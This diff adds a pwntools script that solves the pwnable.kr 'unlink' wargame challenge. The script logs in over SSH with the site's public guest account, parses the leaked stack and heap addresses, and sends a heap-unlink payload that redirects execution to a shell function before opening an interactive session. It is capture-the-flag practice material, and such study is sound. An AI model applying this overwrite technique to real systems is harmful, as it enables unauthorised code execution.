@@ -1,0 +1,16 @@
+from pwn import *
+con = ssh(host= 'pwnable.kr',port = 2222,user ='unlink',password = 'guest')
+s = con.process('./unlink')
+shell = 0x080484eb
+s.recvuntil("here is stack address leak: ")
+stack_addr = s.recv(10)
+stack_addr = int(stack_addr,16)
+s.recvuntil("here is heap address leak: ")
+heap_addr = s.recv(9)
+heap_addr = int(heap_addr,16)
+payload = p32(shell)
+payload += 'A' * 12
+payload += p32(heap_addr+12)
+payload += p32(stack_addr+0x10)
+s.send(payload)
+s.interactive()
